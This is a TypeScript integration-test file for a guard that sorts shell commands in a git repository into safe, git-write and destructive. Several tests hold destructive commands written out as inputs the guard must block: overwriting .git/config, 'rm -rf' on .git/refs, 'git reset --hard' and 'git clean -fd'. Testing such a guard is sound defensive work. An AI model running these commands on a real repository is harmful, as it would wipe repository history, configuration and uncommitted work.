// CATEGORY 7: Real git repo integration tests
// ═════════════════════════════════════════════════════════════════════════════

describe("Category 7 — Real git repo integration", () => {
	test("guard passes: git add -A && git diff --cached", () => {
		expectSafe("git add -A && git diff --cached --stat");
	});

	test("guard passes: git log | grep pattern", () => {
		expectSafe("git log --oneline --all | grep 'feat:'");
	});

	test("guard passes: git status --short | awk '{print $2}'", () => {
		expectSafe("git status --short | awk '{print $2}'");
	});

	test("guard blocks: echo > <repoDir>/.git/config (absolute path redirect)", () => {
		const cmd = `echo '[core]' > ${testRepoDir}/.git/config`;
		const result = isGitUnsafeBash(cmd);
		expect(result).not.toBeNull();
		expect(result!.type).toBe("git_write");
	});

	test("guard blocks: rm -rf <repoDir>/.git/refs (absolute path)", () => {
		expectGitWrite(`rm -rf ${testRepoDir}/.git/refs`);
	});

	test("guard blocks: cd <repoDir> && git reset --hard HEAD", () => {
		expectDestructive(`cd ${testRepoDir} && git reset --hard HEAD`);
	});

	test("guard blocks: cd <repoDir> && git clean -fd", () => {
		expectDestructive(`cd ${testRepoDir} && git clean -fd`);
	});

	test("guard passes: typical CI workflow", () => {
		expectSafe(`cd ${testRepoDir} && git fetch origin && git rebase origin/main && bun test`);
	});
});
